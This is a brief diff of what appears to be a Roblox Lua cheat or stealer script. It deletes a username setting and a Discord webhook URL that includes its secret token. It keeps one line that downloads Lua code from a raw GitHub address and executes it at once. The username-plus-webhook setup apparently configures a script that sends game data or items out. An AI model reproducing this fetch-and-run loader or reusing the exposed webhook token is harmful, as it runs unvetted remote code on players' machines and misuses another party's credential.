@@ -1,4 +1,1 @@
-Username = "fatingacc"
-Webhook = "https://discord.com/api/webhooks/1372204472503238736/gjO1VRu9ypbf_jqZehzyL_SRCTnYpf_RkMGgzQV_RE9w4NrQfXrz6dACLWAByVUPBmkf"
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/regabbb22/Showcase/refs/heads/main/REHAN_123"))()
